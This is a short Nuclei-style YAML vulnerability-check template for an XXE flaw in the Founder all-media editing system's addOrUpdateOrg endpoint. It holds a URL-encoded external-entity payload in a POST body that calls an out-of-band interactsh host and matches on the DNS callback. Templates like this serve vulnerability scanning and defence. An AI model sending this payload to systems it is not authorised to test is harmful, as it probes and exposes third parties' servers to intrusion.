id: poc-yaml-founder-addorupdateorg-xxe
info:
  name: 方正全媒体采编系统 addOrUpdateOrg XXE漏洞
  author: ProjectDiscoveryAI
  severity: high
  tags: xxe,dnslog
http:
  - raw:
      - |
        POST /newsedit/api/orgUser/addOrUpdateOrg HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded

        xmlStr=%3C!DOCTYPE%20root%20%5B%20%3C!ENTITY%20%25%20remote%20SYSTEM%20%22https://{{interactsh-url}}%22%3E%20%25remote;%5D%3E
    stop-at-first-match: true
    matchers:
      - type: word
        part: interactsh_protocol
        words:
          - "dns"
